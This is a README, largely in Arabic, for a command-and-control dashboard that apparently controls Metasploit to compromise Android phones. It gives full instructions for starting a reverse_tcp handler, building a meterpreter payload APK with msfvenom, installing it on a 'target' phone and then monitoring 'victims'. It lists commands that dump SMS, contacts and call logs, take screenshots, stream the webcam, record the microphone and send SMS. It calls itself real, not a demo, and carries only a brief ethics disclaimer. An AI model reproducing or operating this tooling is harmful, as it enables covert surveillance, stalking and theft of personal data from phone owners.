# 🔥 HAMZA SKU - Professional C2 Dashboard

## Real Metasploit Integration for Android Exploitation

---

## 🎯 هذا مشروع حقيقي 100%!

**ليس تمثيل أو Demo!** هذا Dashboard يتصل فعلياً بـ Metasploit ويتعامل مع Sessions حقيقية!

---

## 📋 المتطلبات

### 1. Metasploit Framework
```bash
# تثبيت Metasploit (على Kali Linux)
sudo apt update
sudo apt install metasploit-framework
```

### 2. Python 3 والمكتبات
```bash
pip3 install -r requirements.txt --break-system-packages
```

---

## 🚀 التشغيل الكامل (خطوة بخطوة)

### الخطوة 1: تشغيل Metasploit RPC

```bash
# في terminal منفصل:
msfrpcd -P msf_password -S -a 127.0.0.1

# سترى:
# [*] MSGRPC Service:  127.0.0.1:55553
# [*] MSGRPC Username: msf
# [*] MSGRPC Password: msf_password
```

**⚠️ مهم:** اترك هذا Terminal مفتوحاً!

### الخطوة 2: تشغيل Dashboard

```bash
# في terminal آخر:
python3 c2_server.py

# سترى:
# ╔═══════════════════════════════════════════════════════════╗
# ║            🔥 HAMZA SKU - C2 DASHBOARD 🔥                 ║
# ║   Professional Metasploit Integration Platform           ║
# ╚═══════════════════════════════════════════════════════════╝
```

### الخطوة 3: الوصول للـ Dashboard

```
1. افتح المتصفح
2. اذهب إلى: http://localhost:5000
3. Password: hamza_sku_2026
```

### الخطوة 4: إعداد Handler

```
في صفحة Setup:
1. LHOST: 0.0.0.0 (أو IP الخاص بك)
2. LPORT: 4444 (أو أي منفذ)
3. PAYLOAD: android/meterpreter/reverse_tcp
4. اضغط: 🚀 START HANDLER
```

### الخطوة 5: إنشاء Payload

```bash
# في terminal جديد:
msfvenom -p android/meterpreter/reverse_tcp \
  LHOST=YOUR_IP \
  LPORT=4444 \
  -o payload.apk

# استبدل YOUR_IP بـ IP الفعلي الخاص بك
```

### الخطوة 6: تثبيت على الهاتف

```
1. انقل payload.apk للهاتف
2. ثبّت التطبيق (قد تحتاج تفعيل Unknown Sources)
3. افتح التطبيق
4. سيتصل تلقائياً!
```

### الخطوة 7: مراقبة الضحايا

```
1. اذهب للـ Dashboard (زر GO TO DASHBOARD)
2. سترى Target يظهر في الجدول
3. 🎯 Alert: "New Victim Connected"
4. اضغط على Target لفتح صفحة التحكم
```

---

## 🎛️ ال

ميزات الحقيقية

### ✅ ما يعمل فعلياً:

| الميزة | الحالة | التفاصيل |
|--------|--------|----------|
| **Metasploit Integration** | ✅ حقيقي | اتصال فعلي عبر RPC |
| **Handler Management** | ✅ حقيقي | exploit/multi/handler |
| **Session Detection** | ✅ حقيقي | كشف تلقائي للـ Sessions |
| **Command Execution** | ✅ حقيقي | تنفيذ على Meterpreter |
| **File Download** | ✅ حقيقي | تحميل ملفات فعلية |
| **System Info** | ✅ حقيقي | معلومات حقيقية |
| **Geolocation** | ✅ حقيقي | موقع من IP API |
| **Screenshots** | ✅ حقيقي | لقطات شاشة فعلية |
| **SMS Dump** | ✅ حقيقي | رسائل حقيقية |
| **Contacts Dump** | ✅ حقيقي | جهات اتصال فعلية |

---

## 🎯 سيناريو استخدام كامل

### المثال: اختراق هاتف Android

```bash
# 1. ابدأ Metasploit RPC
msfrpcd -P msf_password -S -a 127.0.0.1

# 2. شغّل Dashboard
python3 c2_server.py

# 3. سجل دخول
# http://localhost:5000
# Password: hamza_sku_2026

# 4. ابدأ Handler
LHOST: 192.168.1.10  # IP الخاص بك
LPORT: 4444
PAYLOAD: android/meterpreter/reverse_tcp
→ START HANDLER

# 5. أنشئ Payload
msfvenom -p android/meterpreter/reverse_tcp \
  LHOST=192.168.1.10 \
  LPORT=4444 \
  -o evil.apk

# 6. ثبّت على الهاتف المستهدف

# 7. في Dashboard:
→ يظهر Target تلقائياً
→ Alert: "🎯 New Victim from 192.168.1.50"
→ اضغط على Target

# 8. في صفحة Session:
→ اضغط "📍 Location" → يعطيك الموقع
→ اضغط "💬 Get SMS" → يجلب الرسائل
→ اضغط "📞 Contacts" → يجلب الأسماء
→ اضغط "📸 Screenshot" → يلتقط الشاشة

# 9. تحميل الملفات:
→ كل ملف يحفظ في مجلد downloads/
→ اضغط زر Download لتحميله
```

---

## 🔧 الأوامر المتاحة

### Quick Modules (أزرار سريعة):

| الزر | الأمر الفعلي | الوصف |
|------|-------------|--------|
| **💻 System Info** | `sysinfo` | معلومات النظام |
| **📍 Location** | `run post/multi/gather/geolocate` | الموقع الجغرافي |
| **📸 Screenshot** | `screenshot` | لقطة شاشة |
| **📷 Webcam** | `webcam_snap` | صورة كاميرا |
| **💬 Get SMS** | `dump_sms` | جميع الرسائل |
| **📞 Contacts** | `dump_contacts` | جهات الاتصال |
| **📱 Call Log** | `dump_calllog` | سجل المكالمات |
| **📱 App List** | `app_list` | التطبيقات المثبتة |
| **🔓 Check Root** | `check_root` | فحص Root |
| **🎙️ Record Mic** | `record_mic` | تسجيل صوت |

### أوامر Command Terminal:

```bash
# معلومات النظام
sysinfo

# قائمة الملفات
ls /sdcard/
ls /sdcard/DCIM/Camera/

# عرض محتوى ملف
cat /sdcard/file.txt

# تحميل ملف
download /sdcard/photo.jpg

# رفع ملف
upload local_file.txt /sdcard/

# قائمة العمليات
ps

# معلومات الشبكة
ifconfig

# الموقع الجغرافي
run post/multi/gather/geolocate

# لقطة شاشة
screenshot

# جمع بيانات WiFi
wlan_geolocate

# إرسال SMS
send_sms -d "+212612345678" -t "Hello"

# تسجيل صوتي
record_mic -d 10

# بث فيديو من الكاميرا
webcam_stream
```

---

## 📁 بنية المشروع

```
hamza-sku-c2/
├── c2_server.py           # Backend الرئيسي
├── templates/
│   ├── login.html         # صفحة Login
│   ├── setup.html         # صفحة إعداد Handler
│   ├── dashboard.html     # صفحة عرض Targets
│   └── session.html       # صفحة التحكم بـ Session
├── downloads/             # الملفات المحملة
├── requirements.txt       # المكتبات المطلوبة
└── README.md             # هذا الملف
```

---

## ⚠️ استكشاف الأخطاء

### المشكلة 1: "Failed to connect to Metasploit RPC"

**الحل:**
```bash
# 1. تأكد من تشغيل msfrpcd:
ps aux | grep msfrpcd

# 2. إذا لم يكن يعمل:
msfrpcd -P msf_password -S -a 127.0.0.1

# 3. تحقق من المنفذ:
netstat -tulpn | grep 55553
```

### المشكلة 2: لا يظهر Target

**الحل:**
```bash
# 1. تأكد من Handler يعمل:
# في Dashboard → Setup → يجب أن يكون Handler State: RUNNING

# 2. تحقق من Sessions في Metasploit:
# في terminal:
msfconsole
msf6 > sessions -l

# 3. إذا Session موجود في msf لكن ليس في Dashboard:
# أعد تشغيل Dashboard
```

### المشكلة 3: Payload لا يتصل

**الحل:**
```bash
# 1. تأكد من IP صحيح:
ip addr show | grep inet

# 2. تأكد من Firewall مفتوح:
sudo ufw allow 4444

# 3. تأكد من الهاتف في نفس الشبكة:
ping PHONE_IP

# 4. جرب منفذ آخر:
# استخدم 443 أو 8080 بدلاً من 4444
```

---

## 🔐 الأمان

### ⚠️ تحذيرات مهمة:

1. **للاختبار الأخلاقي فقط!**
2. **لا تستخدم على أجهزة بدون إذن**
3. **غيّر كلمة المرور الافتراضية**
4. **غيّر كلمة مرور Metasploit RPC**
5. **لا تعرض Dashboard على الإنترنت**

### تغيير كلمات المرور:

```python
# في c2_server.py:

# كلمة مرور Dashboard:
MASTER_PASSWORD = "your_new_password_here"

# كلمة مرور Metasploit RPC:
MSF_RPC_PASSWORD = "your_new_msf_password"
```

---

## 📞 الدعم

### إذا واجهت مشاكل:

1. تأكد من تشغيل `msfrpcd` أولاً
2. راجع logs في Terminal
3. تحقق من المتطلبات مثبتة
4. جرب إعادة تشغيل كل شيء

---

## ✅ Checklist قبل الاستخدام

- [ ] Metasploit Framework مثبت
- [ ] Python 3 مثبت
- [ ] المكتبات مثبتة (`pip3 install -r requirements.txt`)
- [ ] `msfrpcd` يعمل
- [ ] Dashboard يعمل (`python3 c2_server.py`)
- [ ] سجلت دخول بنجاح
- [ ] Handler يعمل (Status: RUNNING)
- [ ] Payload جاهز
- [ ] Firewall مفتوح

---

**🔥 الآن لديك C2 Dashboard احترافي حقيقي! 🔥**

*Professional. Real. Powerful.*
